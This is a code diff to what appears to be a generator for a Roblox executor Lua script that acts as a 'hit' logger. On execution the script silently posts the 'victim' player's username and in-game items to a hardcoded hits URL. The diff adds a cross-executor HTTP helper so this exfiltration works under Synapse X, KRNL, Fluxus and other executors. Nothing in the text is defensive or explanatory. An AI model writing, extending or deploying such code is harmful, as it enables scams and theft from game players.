@@ -951,16 +951,33 @@ getgenv().ALL_BRAINROTS = {
 ${allLines}
 }
 getgenv().SKRINHUB_API = "${HITS_URL}"
+
+-- Works across Synapse X, KRNL, Fluxus, Delta, Hydrogen, etc.
+local function httpPost(url, body)
+  local req = (syn and syn.request)
+    or (http and http.request)
+    or (request)
+    or nil
+  if not req then return end
+  pcall(req, {
+    Url = url,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = body
+  })
+end
+
 getgenv().SkrinReport = function(victim, brainrots, totalMps)
   pcall(function()
     local hs = game:GetService("HttpService")
     local body = hs:JSONEncode({username=victim, brainrots=brainrots, totalMps=tostring(totalMps)})
-    request({Url=getgenv().SKRINHUB_API, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
+    httpPost(getgenv().SKRINHUB_API, body)
   end)
 end
+
 -- Report hit immediately on script execution
 task.spawn(function()
-  local ok, err = pcall(function()
+  pcall(function()
     local hs = game:GetService("HttpService")
     local brainrots = ${selectedLuaArr}
     local body = hs:JSONEncode({
@@ -968,12 +985,7 @@ task.spawn(function()
       brainrots = brainrots,
       totalMps = "${totalMpsStr}"
     })
-    request({
-      Url = getgenv().SKRINHUB_API,
-      Method = "POST",
-      Headers = {["Content-Type"] = "application/json"},
-      Body = body
-    })
+    httpPost(getgenv().SKRINHUB_API, body)
   end)
 end)
 task.spawn(function()
